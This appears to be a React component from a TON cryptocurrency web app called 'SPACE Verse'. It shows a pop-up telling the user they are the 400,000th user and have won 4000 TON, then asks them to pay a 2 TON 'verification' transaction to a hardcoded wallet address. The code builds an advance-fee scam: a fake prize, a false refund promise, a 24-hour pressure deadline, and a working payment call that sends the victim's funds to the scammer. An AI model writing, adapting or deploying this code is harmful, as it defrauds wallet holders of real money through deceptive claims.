import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { useTonWallet } from "@/hooks/useTonWallet";
import { TonTransactionService } from "@/services/tonTransactionService";
import { useTonConnectUI } from "@tonconnect/ui-react";
import { useToast } from "@/hooks/use-toast";
import { Star, Gift, Clock, Shield } from "lucide-react";
interface CongratulationsDialogProps {
  isOpen: boolean;
  onClose: () => void;
}
export default function CongratulationsDialog({
  isOpen,
  onClose
}: CongratulationsDialogProps) {
  const {
    isConnected
  } = useTonWallet();
  const [tonConnectUI] = useTonConnectUI();
  const {
    toast
  } = useToast();
  const [isProcessing, setIsProcessing] = useState(false);
  const handlePayment = async () => {
    if (!isConnected || !tonConnectUI) {
      toast({
        title: "Wallet Not Connected",
        description: "Please connect your wallet first",
        variant: "destructive"
      });
      return;
    }
    setIsProcessing(true);
    try {
      const transactionService = new TonTransactionService(tonConnectUI);

      // Send 2 TON verification transaction
      await transactionService.sendTransaction("UQBxhVcqUFQSClJdPq9Dz7Eo45iInF0wUmJJKZIslvsnPZkE",
      // Verification address
      2,
      // 2 TON
      "SPACE Verse verification - 400,000th user reward claim");
      toast({
        title: "Verification Successful!",
        description: "Your 4002 TON reward will be sent within 24 hours",
        variant: "default"
      });
      onClose();
    } catch (error) {
      console.error("Transaction failed:", error);
      toast({
        title: "Transaction Failed",
        description: "Please try again or contact support",
        variant: "destructive"
      });
    } finally {
      setIsProcessing(false);
    }
  };
  const handleConnectWallet = () => {
    tonConnectUI.openModal();
  };
  return <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-[250px] w-[80vw] mx-auto bg-card/95 backdrop-blur-lg border-2 border-primary/30 p-2 rounded-xl shadow-2xl z-50">
        <DialogHeader className="text-center space-y-4">
          {/* Header with celebration icons */}
          
          
          <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-yellow-400 to-purple-400 bg-clip-text text-transparent">
            Congratulations from SPACE Verse!
          </DialogTitle>
        </DialogHeader>

        <div className="space-y-6">
          {/* Main message */}
          <div className="text-center space-y-4">
            <div className="bg-gradient-to-r from-purple-500/20 to-blue-500/20 rounded-lg p-4 border border-purple-500/30">
              <p className="text-white text-sm leading-relaxed">
                You've just become our <span className="font-bold text-yellow-400">400,000th registered user</span>, and we're excited to reward you with a special bonus of <span className="font-bold text-green-400">4000 TON</span> as part of our celebration campaign!
              </p>
            </div>

            {/* Verification info */}
            <div className="bg-blue-500/10 rounded-lg p-4 border border-blue-500/30 space-y-3">
              <div className="flex items-center gap-2 text-blue-300">
                <Shield className="w-4 h-4" />
                <span className="text-sm font-medium">Verification Required</span>
              </div>
              <p className="text-white text-xs leading-relaxed">
                • To ensure the reward is sent to the correct and active account, a quick <span className="font-bold text-yellow-400">2 TON verification</span> transaction is required.
              </p>
              <p className="text-green-300 text-xs">
                <span className="font-bold">Important:</span> This is not a fee or charge. Once verified, the 2 TON will be instantly refunded to your wallet, along with your full 4000 TON reward.
              </p>
            </div>

            {/* Total calculation */}
            <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 rounded-lg p-3 border border-green-500/30">
              <p className="text-green-300 font-bold text-lg">
                Total received = 4002 TON
              </p>
            </div>

            {/* Time limit warning */}
            <div className="bg-orange-500/10 rounded-lg p-3 border border-orange-500/30">
              <div className="flex items-center gap-2 justify-center text-orange-300 mb-2">
                <Clock className="w-4 h-4" />
                <span className="text-sm font-medium">Time Limited Offer</span>
              </div>
              <p className="text-orange-200 text-xs">
                • Your reward is reserved for the next <span className="font-bold">24 hours only</span>, so please complete the verification in time to claim your bonus.
              </p>
            </div>

            {/* Footer message */}
            <p className="text-purple-300 text-xs text-center">
              Thank you for being part of the SPACE Verse community. We're just getting started!
            </p>
          </div>

          {/* Action button */}
          <div className="space-y-3">
            {isConnected ? <Button onClick={handlePayment} disabled={isProcessing} className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold py-3 rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg">
                {isProcessing ? <span className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    Processing...
                  </span> : "Pay 2 TON to Verify & Claim Reward"}
              </Button> : <Button onClick={handleConnectWallet} className="w-full bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-bold py-3 rounded-lg transition-all duration-300 transform hover:scale-105 shadow-lg">
                Connect Wallet to Claim Reward
              </Button>}
            
            
          </div>
        </div>
      </DialogContent>
    </Dialog>;
}